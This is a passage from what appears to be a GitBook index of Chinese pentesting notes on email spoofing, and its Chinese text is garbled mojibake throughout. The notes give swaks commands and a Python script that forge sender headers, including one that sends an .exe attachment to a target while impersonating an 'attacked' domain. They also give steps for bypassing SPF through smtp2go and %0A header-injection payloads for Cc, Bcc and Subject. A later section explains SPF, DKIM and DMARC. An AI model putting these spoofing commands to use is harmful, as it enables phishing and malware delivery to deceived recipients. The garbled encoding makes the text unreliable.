user@example.comï¼šæ”¶ä»¶äºº --from me@example.comï¼šå‘ä»¶äºº --server test-server.example.comï¼šsmtp æœåŠ¡å™¨ -au me@example.comï¼šé‚®ä»¶ç”¨æˆ· -ap xxxxpasswordï¼šå¯†ç  --body [string or file path]ï¼šé‚®ä»¶æ­£æ–‡ --ehlo [helo-string]ï¼šä¼ªé€  ehlo å¤´ä¿¡æ¯ --header [header-and-data]ï¼šä¼ªé€  Fromã€Subjectã€Message-Idã€X-Mailer ç­‰å¤´ä¿¡æ¯ï¼Œå¦‚ --header'Subjectï¼šé‚®ä»¶ä¸»é¢˜å†…å®¹' --data [data-portion]ï¼šä¼ªé€  DATA çš„å…¨éƒ¨å†…å®¹ï¼Œå¯ç›´æ¥å°†é‚®ä»¶æºç ä½œä¸ºé€‰é¡¹ --attach [attachment-specification]ï¼šæ·»åŠ é™„ä»¶ è‡ªå®šä¹‰ header å­—æ®µ swaks æ”¯æŒè‡ªå®šä¹‰æŸäº› Headerï¼Œå‚æ•°å¦‚ä¸‹ï¼š swaks --header- å¦‚æœæƒ³å»é™¤ Mailer ç‰¹å¾ï¼Œå°±å¯ä»¥è¿™ä¹ˆåšï¼š swaks --header-X-Mailer gmail.com ä¼ªé€  header-from --h-From: 'ç®¡ç†å‘˜' å‘é€é‚®ä»¶åŸæ–‡å’Œæ·»åŠ é™„ä»¶ --data å‚æ•° --attach å‚æ•° swaks --to è¦å‘ç»™çš„ç›®æ ‡@gmail.com --from ä½ æ‹¥æœ‰çš„é‚®ç®±@xxxmail.net --ehlo gmail.comï¼ˆéœ€è¦æ”»å‡»çš„åŸŸåï¼‰ --data Test.emlï¼ˆé‚®ä»¶åŸæ–‡ã€‚å¯ä»¥å…ˆç”¨é‚®ç®±ç”Ÿæˆå†å¯¼å‡ºé‚®ä»¶åŸæ–‡ï¼‰ --attach /tmp/é™„ä»¶.exe --header-X-Mailer gmail.comï¼ˆéœ€è¦æ”»å‡»çš„åŸŸåï¼‰ --server xxxmail.netï¼ˆä½ é‚®ç®±çš„æœåŠ¡å™¨ï¼‰ -p 25 -au ä½ æ‹¥æœ‰çš„é‚®ç®±è´¦å·@xxxmail.net -ap zqD2q7wkKbxxsdaddaï¼ˆå¯†ç ï¼‰ python å®ç° #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.header import Header mail_host=\"mail.smtp2go.com\" mail_user=\"\" mail_pass=\"\" sender = 'test@smtp2go.com' receivers = ['target@gmail.com'] message = MIMEText('Hello World', 'plain', 'utf-8') message['From'] = Header(\"admin@qq.com\", 'utf-8') message['To'] = Header(receivers[0], 'utf-8') subject = 'SMTP é‚®ä»¶æµ‹è¯•' message['Subject'] = Header(subject, 'utf-8') try: smtpObj = smtplib.SMTP() smtpObj.connect(mail_host, 25) smtpObj.login(mail_user,mail_pass) smtpObj.sendmail(sender, receivers, message.as_string()) print \"Success\" except smtplib.SMTPException: print \"Error\" smtp2go smtp2go ä¸»è¦æ˜¯ç›¸å½“äºé‚®ä»¶æ‰˜ç®¡ï¼Œå¯ä»¥åˆ†å‘å­è´¦æˆ·è¿›è¡Œå‘é€ã€‚ åœ°å€ï¼šhttps://support.smtp2go.com/hc/en-gb ï¼ˆé‚®ç®±æ³¨å†Œï¼‰æ™®é€šè´¦æˆ·å¯ä»¥å…è´¹å‘ 1000 å°é‚®ä»¶ï¼Œéœ€è¦å¢ƒå¤–æ‰‹æœºå·ç ï¼ˆæ¥ç å¹³å°ï¼‰ã€‚ åˆ†é…å¥½è´¦æˆ·åï¼Œå¯ä»¥é€šè¿‡ swaks è¿›è¡Œç™»å½•å‘é€é‚®ä»¶ï¼š swaks --to evilxxx@gmail.com --from éœ€è¦ä¼ªé€ çš„@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap SPF ç»•è¿‡ swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: 'ç®¡ç†å‘˜' --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap ç”±äºé‚®ä»¶æ˜¾ç¤ºçš„æ˜¯ Header ä¸­çš„ From ä¸æ˜¯ smtp.fromï¼Œå› æ­¤å¯ä»¥å°† smtp.from è®¾ç½®ä¸ºæ­£å¸¸çš„é‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œä¼ªé€ ä¸€ä¸ª Mail.From å³å¯ã€‚ ä½†æ˜¯ç°åœ¨è¿™ç§é‚®ç®±éƒ½ä¼šæ˜¾ç¤ºä»£å‘ï¼Œåˆæˆ–è€… mail.fromï¼ˆheader.fromï¼‰ å’Œ smtp.from ä¸ä¸€è‡´çš„è¯ä¼šç›´æ¥è¢«é‚®ä»¶æœåŠ¡å™¨æ‹’æ”¶ã€‚ é‚®ä»¶æ³¨å…¥ é‚®ä»¶æ³¨å…¥å’Œ HTTP å¤´éƒ¨æ³¨å…¥ç›¸ä¼¼ï¼Œè¿™ç§æ¼æ´å‘ç”Ÿåœ¨ä¸€ä¸ªç¼–ç¨‹è¯­è¨€åµŒå…¥å¦ä¸€ä¸ªï¼Œæ¯”å¦‚ mysql åµŒå…¥phpã€‚ å¯¹äºé‚®ä»¶å¤´éƒ¨çš„å­—æ®µå…¶å®å°±æ˜¯æ¢è¡Œç¬¦ 0x0A æˆ–è€… 0x0D0x0A åˆ†å‰² ï¼Œåœ¨ç»å¤§éƒ¨åˆ†ç³»ç»Ÿé‡Œé¢ä¸æ˜¯ \\n å°±æ˜¯ \\r\\nï¼Œæ‰€ä»¥å°±å¯ä»¥æ³¨å…¥äº†ã€‚ ç”µå­é‚®ä»¶æ³¨å…¥æ˜¯é’ˆå¯¹é‚®ä»¶åŠŸèƒ½çš„ä¸€ç§æ”»å‡»ç±»å‹ã€‚å®ƒå…è®¸æ¶æ„æ”»å‡»è€…æ³¨å…¥ä»»ä½•é‚®ä»¶å¤´å­—æ®µï¼ŒBCCã€CCã€ä¸»é¢˜ç­‰ï¼Œå®ƒå…è®¸é»‘å®¢é€šè¿‡æ³¨å…¥æ‰‹æ®µä»å—å®³è€…çš„é‚®ä»¶æœåŠ¡å™¨å‘é€åƒåœ¾é‚®ä»¶ã€‚å®ƒå¯èƒ½ä¼šå½±å“ä»»ä½•ä»ç”¨æˆ· UI æ¥æ”¶æ¶ˆæ¯å¹¶å‘é€ç”µå­é‚®ä»¶æ¶ˆæ¯çš„åº”ç”¨ç¨‹åºã€‚è¿™ç§æ”»å‡»çš„ä¸»è¦åŸå› æ˜¯ä¸é€‚å½“çš„ç”¨æˆ·è¾“å…¥éªŒè¯æˆ–åº”ç”¨ç¨‹åºæ ¹æœ¬æ²¡æœ‰éªŒè¯å’Œè¿‡æ»¤æœºåˆ¶ã€‚ æ³¨å…¥åˆ†ç±» å‘ä»¶äººï¼Œä¸»é¢˜ï¼Œå†…å®¹ å‘ä»¶äººä¿®æ”¹ æœ¬æ¥å‘ä»¶äººå°±å¯æ§ï¼Œæˆ–è€…åœ¨åˆ«çš„å­—æ®µé‡Œé‡å¤æ·»åŠ ï¼Œä½†æ˜¯è¦çœ‹é‚®ä»¶æœåŠ¡å™¨é’ˆå¯¹å¤šä¸ª from æ˜¯å¦‚ä½•å®ç°çš„ï¼Œæ˜¯å–ç¬¬ä¸€ä¸ªï¼Œè¿˜æ˜¯å–æœ€åä¸€ä¸ªï¼Œè¿˜æ˜¯å¦‚ä½•æ“ä½œã€‚ from:sender@domain.com%0Afrom:attacker@domain.com æ”¶ä»¶äººã€æŠ„é€äººæ³¨å…¥ï¼ˆCc/Bccæ³¨å…¥ï¼‰ åœ¨å‘é€è€…å­—æ®µ(sender)åæ³¨å…¥ Cc å’Œ Bcc å‚æ•° From:sender@domain.com%0ACc:recipient@domain.com%0ABcc:recipient1@domain.com æ‰€ä»¥ç°åœ¨ï¼Œæ¶ˆæ¯å°†è¢«å‘é€åˆ° recipient å’Œ recipient1 è´¦æˆ·ã€‚ ä¸»é¢˜æ³¨å…¥ æ”»å‡»è€…æ³¨å…¥çš„å‡çš„ä¸»é¢˜ subject å°†è¢«æ·»åŠ åˆ°åŸæ¥çš„ä¸»é¢˜ä¸­å¹¶ä¸”åœ¨æŸäº›æƒ…å†µä¸‹å°†å–ä»£åŸæœ¬çš„ä¸»é¢˜ subjectï¼Œè¿™å–å†³äºé‚®ä»¶æœåŠ¡è¡Œä¸ºã€‚å³ä»£ç ç¼–å†™çš„å®¹é”™æ€§ï¼Œå½“å‚æ•°ä¸­å‡ºç°ä¸¤ä¸ª subject çš„æ—¶å€™ä»£ç æ˜¯é€‰æ‹©ä¸¢å¼ƒè¿˜æ˜¯åè€…è¦†ç›–ã€‚ From:sender@domain.com%0ASubject:Thisâ€™s%20Fake%20Subject æ¶ˆæ¯ä½“æ³¨å…¥ è¦æ³¨æ„ SMTP çš„ Mail æ ¼å¼ï¼Œæ¶ˆæ¯ä¸»é¢˜å’Œå¤´éƒ¨ Header ä¹‹é—´æœ‰ä¸¤ä¸ªæ¢è¡Œç¬¦(å’Œ HTTP æ˜¯ä¸€æ ·çš„)ã€‚ From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message. å‡æ¶ˆæ¯å°†è¢«æ·»åŠ åˆ°åŸå§‹æ¶ˆæ¯ä¸­ã€‚ 0x00 å‰äººæ ½æ ‘ é‚®ä»¶æ³¨å…¥æ”»å‡» Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-15 18:10:19 "},"email/é‚®ä»¶åè®®.html":{"url":"email/é‚®ä»¶åè®®.html","title":"é‚®ä»¶åè®®","keywords":"","body":"MIME é‚®ä»¶æ ¼å¼ SMTP ç®€å•é‚®ä»¶ä¼ è¾“åè®® Simple Mail Transfer Protocol Sendmail æ˜¯æœ€æ—©ä½¿ç”¨ SMTP çš„é‚®ä»¶ä¼ è¾“ä»£ç†ä¹‹ä¸€ SMTP æ˜¯ä¸€ä¸ªç›¸å¯¹ç®€å•çš„åŸºäºæ–‡æœ¬çš„åè®®ã€‚æˆ‘ä»¬å¯ä»¥é€è¿‡åè®®ï¼ŒæŒ‡å®šå°†æ¶ˆæ¯å‘é€è‡³ä¸€æˆ–å¤šä¸ªæ¥æ”¶è€…ã€‚æˆ‘ä»¬å¯ä»¥å¾ˆç®€å•åœ°é€šè¿‡ telnet ç¨‹åºæ¥æµ‹è¯•ä¸€ä¸ª SMTP æœåŠ¡å™¨ã€‚SMTP ä¸»è¦ä½¿ç”¨ TCP ç«¯å£ 25ã€‚è¦ä¸ºä¸€ä¸ªç»™å®šçš„åŸŸåå†³å®šä¸€ä¸ª SMTP æœåŠ¡å™¨ï¼Œéœ€è¦ä½¿ç”¨ DNS çš„ MX è®°å½• æœ€åˆçš„ SMTP çš„å±€é™ä¹‹ä¸€ï¼Œåœ¨äºå®ƒæ²¡æœ‰å¯¹å‘é€æ–¹è¿›è¡Œèº«ä»½éªŒè¯çš„æœºåˆ¶ã€‚å› æ­¤ï¼Œåæ¥å®šä¹‰äº† SMTP-AUTH æ‰©å±•ã€‚å°½ç®¡æœ‰äº†èº«ä»½è®¤è¯æœºåˆ¶ï¼Œåƒåœ¾é‚®ä»¶ä»ç„¶æ˜¯ä¸€ä¸ªä¸»è¦çš„é—®é¢˜ã€‚ IRTF çš„ååƒåœ¾é‚®ä»¶ç ”ç©¶å°ç»„æ­£åœ¨ç ”ç©¶ä¸€äº›å»ºè®®æ–¹æ¡ˆï¼Œä»¥æä¾›ç®€å•ã€çµæ´»ã€è½»é‡çº§çš„ã€å¯å‡çº§çš„æºç«¯è®¤è¯ã€‚æœ€æœ‰å¯èƒ½è¢«æ¥å—çš„å»ºè®®æ–¹æ¡ˆæ˜¯å‘ä»¶äººç­–ç•¥æ¡†æ¶åè®®(SPF)ã€‚ æä¾› SSL åŠ å¯†çš„ SMTP åè®®è¢«ç§°ä¸º SMTPS SPF What is SPF (Sender Policy Framework) çš„ç¼©å†™ï¼Œä¸€ç§ä»¥ IP åœ°å€è®¤è¯ç”µå­é‚®ä»¶å‘ä»¶äººèº«ä»½çš„æŠ€æœ¯ï¼Œæ˜¯éå¸¸é«˜æ•ˆçš„åƒåœ¾é‚®ä»¶è§£å†³æ–¹æ¡ˆã€‚ æ¥æ”¶é‚®ä»¶æ–¹ä¼šé¦–å…ˆæ£€æŸ¥åŸŸåçš„ SPF è®°å½•ï¼Œæ¥ç¡®å®šå‘ä»¶äººçš„ IP åœ°å€æ˜¯å¦è¢«åŒ…å«åœ¨SPFè®°å½•é‡Œé¢ï¼Œå¦‚æœåœ¨ï¼Œå°±è®¤ä¸ºæ˜¯ä¸€å°æ­£ç¡®çš„é‚®ä»¶ï¼Œå¦åˆ™ä¼šè®¤ä¸ºæ˜¯ä¸€å°ä¼ªé€ çš„é‚®ä»¶è¿›è¡Œé€€å›ã€‚ å€ŸåŠ© SPF é˜²èŒƒä»¿å†’é‚®ä»¶å’Œåƒåœ¾é‚®ä»¶ ä»€ä¹ˆæ˜¯ DNS SPF è®°å½•ï¼Ÿ SPF è®°å½•æ˜¯ä»€ä¹ˆä»¥åŠå®ƒå¦‚ä½•å·¥ä½œï¼šSPF è®°å½•å…¨è§£é‡Š SPF è®°å½•æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ å®˜æ–¹ SPF è®°å½•æ–‡æ¡£ SPF è®°å½•å¿…é¡»éµå¾ªä¸€å®šçš„æ ‡å‡†ï¼Œä»¥ä¾¿æœåŠ¡å™¨ç†è§£å…¶å†…å®¹ã€‚å¦‚ä¸‹æ˜¯ SPF è®°å½•æ ¸å¿ƒç»„æˆéƒ¨åˆ†çš„ç¤ºä¾‹ï¼š v=spf1 ip4=192.0.2.0 ip4=192.0.2.1 include:examplesender.email -all è¿™ä¸ªä¾‹å­è®©æœåŠ¡å™¨çŸ¥é“è¿™æ˜¯ä»€ä¹ˆç±»å‹çš„è®°å½•ï¼Œå£°æ˜å¯¹è¿™ä¸ªåŸŸè¢«æ‰¹å‡†çš„ IP åœ°å€å’Œç¬¬ä¸‰æ–¹ï¼Œå¹¶å‘ŠçŸ¥æœåŠ¡å™¨å¦‚ä½•å¤„ç†ä¸ç¬¦åˆè¦æ±‚çš„ç”µå­é‚®ä»¶ã€‚æˆ‘ä»¬åˆ†åˆ«è¯´æ˜å„ç»„æˆéƒ¨åˆ†æ˜¯å¦‚ä½•å®ç°è¿™ä¸€ç‚¹çš„ï¼š v=spf1 å‘Šè¯‰æœåŠ¡å™¨è¿™é‡ŒåŒ…å«ä¸€æ¡ SPF è®°å½•ã€‚æ¯ä¸€æ¡ SPF è®°å½•éƒ½å¿…é¡»ä»¥è¿™ä¸ªå­—ç¬¦ä¸²å¼€å§‹ã€‚ ç„¶åæ˜¯ SPF è®°å½•çš„â€œå®¢äººåå•â€éƒ¨åˆ†ï¼Œå³æˆæƒ IP åœ°å€ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼ŒSPF è®°å½•å‘Šè¯‰æœåŠ¡å™¨ï¼Œip4=192.0.2.0 å’Œ ip4=192.0.2.1 è¢«æˆæƒä»£è¡¨è¯¥åŸŸå‘é€ç”µå­é‚®ä»¶ã€‚ include:examplesender.net æ˜¯ â€œincludeâ€ï¼ˆåŒ…å«ï¼‰æ ‡è®°çš„ç¤ºä¾‹ï¼Œè¯¥æ ‡è®°å‘Šè¯‰æœåŠ¡å™¨ï¼Œæœ‰å“ªäº›ç¬¬ä¸‰æ–¹ç»„ç»‡è¢«æˆæƒä»£è¡¨è¯¥åŸŸå‘é€ç”µå­é‚®ä»¶ã€‚è¿™ä¸ªæ ‡è®°è¡¨ç¤ºï¼Œè¢«åŒ…å«åŸŸï¼ˆexamplesender.netï¼‰çš„ SPF è®°å½•å†…å®¹åº”è¢«æ£€æŸ¥ï¼Œå…¶ä¸­åŒ…å«çš„ IP åœ°å€ä¹Ÿåº”è¢«è§†ä¸ºå·²æˆæƒã€‚ä¸€æ¡ SPF è®°å½•ä¸­å¯åŒ…å«å¤šä¸ªåŸŸï¼Œä½†è¿™ä¸ªæ ‡è®°ä»…é€‚ç”¨äºæœ‰æ•ˆçš„åŸŸã€‚ Finally, -all å‘Šè¯‰æœåŠ¡å™¨ï¼ŒSPF è®°å½•ä¸­æœªåˆ—å‡ºçš„åœ°å€æ²¡æœ‰è¢«æˆæƒå‘é€ç”µå­é‚®ä»¶å¹¶åº”è¢«æ‹’ç»ã€‚ è¿™é‡Œçš„å…¶ä»–å¯é€‰é¡¹åŒ…æ‹¬ ~allï¼šè¡¨ç¤ºæœªåˆ—å‡ºçš„ç”µå­é‚®ä»¶å°†è¢«æ ‡è®°ä¸ºä¸å®‰å…¨é‚®ä»¶æˆ–åƒåœ¾é‚®ä»¶ï¼Œä½†ä»ä¼šè¢«æ¥å—ï¼›ä¸é‚£ä¹ˆå¸¸è§çš„æ˜¯ +allï¼šè¡¨ç¤ºä»»ä½•æœåŠ¡å™¨éƒ½å¯ä»¥ä»£è¡¨è¯¥åŸŸå‘é€ç”µå­é‚®ä»¶ã€‚ SPF Record evaluation é‚®ä»¶æœåŠ¡å™¨ä¸­çš„ SPF æ¨¡å—åœ¨å¯¹ SPF è®°å½•ä¸­çš„ terms è¿›è¡Œä¼°å€¼åï¼Œå‘é‚®ä»¶æœåŠ¡å™¨è¿”å›è®¤è¯ (authentication) ç»“æœã€‚ SPF ä¸­æœ‰ 2 ç§ termsï¼šmechanisms ä»¥åŠ modifiersã€‚ SPF è®¤è¯ç»“æœä¸ºä»¥ä¸‹å…¶ä¸­ä¹‹ä¸€ï¼š None: æœªèƒ½æœ‰æ•ˆåœ°è§£é‡ŠåŸŸåï¼Œæˆ–è€…åŸŸåä¸Šæœªæ‰¾åˆ° SPF è®°å½•ï¼› Neutral: å‘èµ·è¯·æ±‚çš„ä¸»æœºçš„ IP åœ°å€æ˜¯å¦å…è®¸å¹¶æœªç¡®å®šï¼› Pass: å‘èµ·è¯·æ±‚çš„ä¸»æœºçš„ IP åœ°å€è¢«å…è®¸ï¼› Fail: å‘èµ·è¯·æ±‚çš„ä¸»æœºçš„ IP åœ°å€ä¸è¢«å…è®¸ï¼› Softfail: å‘èµ·è¯·æ±‚çš„ä¸»æœºçš„ IP åœ°å€å¯èƒ½ä¸è¢«å…è®¸ï¼› Temperror: SPF æ¨¡å—åœ¨æ£€æŸ¥æ—¶ç¢°åˆ°ä¸´æ—¶ç½‘ç»œé”™è¯¯ï¼› Permerror: åŸŸåä¸Šå‘å¸ƒçš„ SPF æ— æ³•è§£é‡Šã€‚è¿™ç§æƒ…å†µï¼ŒåŸŸåç®¡ç†å‘˜é¡»ä¿®å¤æ­¤é”™è¯¯ã€‚ å¦‚æœä¸€ç›´åˆ° SPF è®°å½•çš„æœ«å°¾éƒ½æ²¡æœ‰æ‰¾åˆ°åŒ¹é…ï¼Œè¿”å› neutralã€‚è¿™æ˜¯ SPF ä¼°å€¼çš„ç¼ºçœå€¼ã€‚ SPF qualifiers SPF qualifier å‰ç½®äº SPF mechanismï¼Œç”¨æ¥æŒ‡å®šè¯¥ SPF mechanism çš„ä¼°å€¼ç»“æœã€‚ä»¥ä¸‹æ˜¯æ‰€æœ‰çš„ qualifiersï¼Œä»¥åŠå¯¹åº”çš„ç»“æœï¼š \"+\" pass \"-\" fail \"~\" softfail \"?\" neutral SPF mechanisms æœ‰ä¸¤ç§ SPF mechanismsï¼šåŸºæœ¬ mechanisms å’ŒæŒ‡å®šå‘é€è€… mechanismsã€‚ åŸºæœ¬ mechanisms æœ‰ all å’Œ includeã€‚ æŒ‡å®šå‘é€è€… mechanisms æœ‰ aï¼Œmxï¼Œptrï¼Œip4ï¼Œip6ï¼Œå’Œ existsã€‚ include å¯ä»¥è®© SPF è®°å½•æŠŠå®šä¹‰åœ¨å¦å¤–ä¸€ä¸ª SPF è®°å½•ä¸­çš„ç¬¬ä¸‰æ–¹ IP åœ°å€åŒ…æ‹¬è¿›æ¥ã€‚ è¦ç¡®ä¿ SPF è®°å½•æœ‰æ•ˆï¼Œéœ€è¦æ³¨æ„å¦‚ä¸‹å‡ ç‚¹ï¼š æ¯ä¸ªåŸŸä¸èƒ½å…³è”å¤šæ¡ SPF è®°å½•ã€‚ è®°å½•å¿…é¡»ä»¥ all éƒ¨åˆ†ç»“æŸï¼Œæˆ–åŒ…å«ä¸€ä¸ª redirect: éƒ¨åˆ†ï¼ˆè¡¨ç¤ºè¯¥ SPF è®°å½•ç”±å¦ä¸€ä¸ªåŸŸæ‰˜ç®¡ï¼‰ã€‚ SPF è®°å½•ä¸èƒ½åŒ…å«å¤§å†™å­—æ¯ã€‚ SPF modifiers SPF æœ‰ä¸¤ä¸ª modifiersï¼šredirect å’Œ expã€‚ SPF modifiers æ˜¯å¯é€‰çš„ã€‚ æ¯æ¡ SPF record ä¸­çš„ä»»ä½• SPF modifier åªèƒ½å¤Ÿä½¿ç”¨ä¸€æ¬¡ã€‚ æœªçŸ¥çš„ modifiers ä¼šè¢«å¿½ç•¥ã€‚ redirect=ï¼šåœ¨ domain ä¸Šé¢çš„ SPF è®°å½•ä¼šä»£æ›¿å½“å‰çš„ SPF è®°å½•ã€‚ exp=ï¼šå¦‚æœ SPF è®°å½•ä¼°å€¼å¤±è´¥ï¼Œå¹¶ä¸”å­˜åœ¨ exp modifierï¼ŒSPF è¿”å›ä¸€ä¸ªä¸²æ¥è§£é‡ŠåŸå› ã€‚ EXAMPLE å¦‚ï¼š å¦‚æœ mail.smtp2go.com æ˜¯æˆ‘çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œé‚£ä¹ˆ gmail æœåŠ¡å™¨æ”¶åˆ°çš„æº IP ä¹Ÿè‚¯å®šæ˜¯ mail.smtp2go.com çš„ IPã€‚ gmail ä¼šæ ¡éªŒé‚®ä»¶å‘é€è€…çš„ IP æ˜¯å¦å­˜åœ¨äº smtp.from çš„åŸŸå spf é…ç½®åˆ—è¡¨é‡Œã€‚ ä½¿ç”¨ Swaks swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap smtp.from å°±æ˜¯ admin@qq.comï¼Œå’Œ mail.smtp2go.com çš„ IP è‚¯å®šä¸åŒï¼Œæ‰€ä»¥ SPF æ ¡éªŒå¤±è´¥ï¼Œè€Œæ ¡éªŒå¤±è´¥çš„é‚®ä»¶ï¼Œä¼šæœ‰å¾ˆé«˜çš„å‡ ç‡è¢«æ‰”åˆ°åƒåœ¾é‚®ä»¶ä¸­ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæœªè®¾ç½® Mail.From ä¹Ÿå°±æ˜¯é‚®ä»¶å¤´çš„ Fromï¼Œåˆ™ä¼šä½¿ç”¨ smtp.from ä½œä¸º Mail.Fromã€‚ What is a DNS TXT record? DNSâ€œæ–‡æœ¬â€(TXT) è®°å½•å…è®¸åŸŸç®¡ç†å‘˜å°†æ–‡æœ¬è¾“å…¥åˆ°åŸŸåç³»ç»Ÿ (DNS) ä¸­ã€‚TXT è®°å½•æœ€åˆçš„ç›®çš„æ˜¯ç”¨ä½œå­˜æ”¾äººç±»å¯è¯»ç¬”è®°çš„åœ°æ–¹ã€‚ä½†æ˜¯ï¼Œç°åœ¨ä¹Ÿå¯ä»¥å°†ä¸€äº›æœºå™¨å¯è¯»çš„æ•°æ®æ”¾å…¥ TXT è®°å½•ä¸­ã€‚ ä¸€ä¸ªåŸŸå¯ä»¥æœ‰è®¸å¤š TXT è®°å½•ã€‚ https://www.cloudflare.com/zh-cn/learning/dns/dns-records/dns-txt-record/ TXT è®°å½•ç¤ºä¾‹ï¼š example.com record type value TTL @ TXT This is an awesome domain!Definitely not spammy. 32600 å¦‚ä»Šï¼ŒDNS TXT è®°å½•çš„ä¸¤ä¸ªæœ€é‡è¦ç”¨é€”æ˜¯é˜²æ­¢åƒåœ¾é‚®ä»¶å’ŒåŸŸåæ‰€æœ‰æƒéªŒè¯ï¼Œå°½ç®¡ TXT è®°å½•æœ€åˆå¹¶éä¸ºè¿™äº›ç”¨é€”è€Œè®¾è®¡ã€‚ æŸ¥è¯¢ SPF # nslookup -q=txt åŸŸå # nslookup -type=txt åŸŸåï¼Œå¦‚ huawei çš„ PS C:\\Users\\Zzzz> nslookup -type=txt huawei.com æœåŠ¡å™¨: public1.114dns.com Address: 114.114.114.114 éæƒå¨åº”ç­”: huawei.com text = \"MS=C4F6A693225CC6E058F6C9C39FD728C06C43E597\" huawei.com text = \"N3U/UqKcdI+8rthQEYTbph+m6MCg7+IW43PP5SuPxww=\" huawei.com text = \"v=spf1 ip4:45.249.212.32 ip4:45.249.212.35 ip4:45.249.212.255 ip4:45.249.212.187/29 ip4:45.249.212.191 ip4:168.195.93.47 ip4:185.176.79.56 ip4:119.8.179.247 ip4:119.8.89.136/31 ip4:119.8.89.135 ip4:119.8.177.36/31 ip4:119.8.177.38 -all\" huawei.com text = \"v=DMARC1;p=none;rua=mailto:dmarc@edm.huawei.com\" # æ²¡æœ‰ SPF PS C:\\Users\\Zor0> nslookup é»˜è®¤æœåŠ¡å™¨: UnKnown Address: 192.168.170.16 > set q=txt > 5000.cn æœåŠ¡å™¨: UnKnown Address: 192.168.170.16 5000.cn primary name server = ns3.dns.com responsible mail addr = admin.dns.com serial = 1546510465 refresh = 7200 (2 hours) retry = 3600 (1 hour) expire = 1209600 (14 days) default TTL = 1800 (30 mins) > SPF çš„ç»•è¿‡ æˆ‘ä»¬åªéœ€è¦è®© smtp.from åŸŸåä¸­é…ç½®çš„ txt è®°å½•å’Œå‘ä¿¡ IP ä¸€ç›´é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ SPF æ ¡éªŒã€‚åˆæˆ–è€…æœ‰çš„åŸŸåæ²¡æœ‰é…ç½® SPF é‚£ä¹ˆä¹Ÿå¯ä»¥è¿›è¡Œä¼ªé€ ã€‚ ç”±äºé‚®ä»¶æ˜¾ç¤ºçš„æ˜¯ Header ä¸­çš„ From ä¸æ˜¯ smtp.fromï¼Œå› æ­¤å¯ä»¥å°† smtp.from è®¾ç½®ä¸ºæ­£å¸¸çš„é‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œä¼ªé€ ä¸€ä¸ª Mail.From å³å¯ã€‚ swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: 'ç®¡ç†å‘˜' --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap Gmail æ¥æ”¶åˆ°è¿™å°é‚®ä»¶åï¼Œä¼šæ ¡éªŒ --from xx@smtp2go.com ä¸­çš„ smtp2go.com æ˜¯å¦ç­‰äº mail.smtp2go.com çš„ IPï¼Œç”±äºæ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥å®Œæˆäº† SPF çš„æ ¡éªŒã€‚ è€Œ DKIM æ˜¯æ ¡éªŒé‚®ä»¶å®Œæ•´æ€§çš„ï¼Œsmtp2go ä¸ Gmail ç›´æ¥ä½¿ç”¨çš„æ˜¯ TLSï¼Œä¸ä¼šå‘ç”Ÿä»€ä¹ˆé—®é¢˜ã€‚ DKIM ä¸ DMARC åŸŸåå¯†é’¥è¯†åˆ«é‚®ä»¶ï¼ˆDomainKeys Identified Mailï¼ŒDKIMï¼‰æ˜¯ä¸€å¥—ç”µå­é‚®ä»¶è®¤è¯æœºåˆ¶ï¼Œä½¿ç”¨å…¬å¼€å¯†é’¥åŠ å¯†é‚®ä»¶ï¼Œä»¥æ£€æµ‹é‚®ä»¶æ˜¯å¦æ˜¯ä¼ªé€ æˆ–è¢«ç¯¡æ”¹ã€‚ã€å®Œæ•´æ€§æ ¡éªŒã€‘ é€šå¸¸å‘é€æ–¹ä¼šåœ¨ç”µå­é‚®ä»¶çš„æ ‡å¤´æ’å…¥ DKIM-Signature åŠç”µå­ç­¾å, è€Œæ¥æ”¶æ–¹åˆ™é€è¿‡ DNS æŸ¥è¯¢å¾—åˆ°å…¬é’¥åè¿›è¡ŒéªŒè¯ã€‚ DMARC å»ºç«‹åœ¨å‘ä»¶äººç­–ç•¥æ¡†æ¶ (SPF)å’ŒåŸŸåè¯†åˆ«é‚®ä»¶ (DKIM)åè®®ä¹‹ä¸Šã€‚å¦‚æœè¿™ä¸¤ç§èº«ä»½éªŒè¯æ–¹æ³•éƒ½ä¸é€šè¿‡ï¼ŒDMARC ç­–ç•¥å°†å†³å®šå¦‚ä½•å¤„ç†è¯¥æ¶ˆæ¯ã€‚DMARC è¦æ±‚åŸŸåæ‰€æœ‰è€…åœ¨ DNS è®°å½•ä¸­è®¾ç½® SPF è®°å½•å’Œ DKIM è®°å½•ï¼Œå¹¶æ˜ç¡®å£°æ˜å¯¹éªŒè¯å¤±è´¥é‚®ä»¶çš„å¤„ç†ç­–ç•¥ã€‚ ä»¥ä¸Šä¸¤ç§æœºåˆ¶ä¹Ÿæ˜¯ç°æœ‰çš„ç”µå­é‚®ä»¶å®‰å…¨æœºåˆ¶ï¼Œä¸è¿‡ä»¥ SPF ç­–ç•¥ä¸ºä¸»ã€‚ 0x00 å‰äººæ ½æ ‘ https://payloads.online/archivers/2019-05-09/1/ https://saucer-man.com/information_security/452.html#cl-4 Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-25 23:22:57 "}}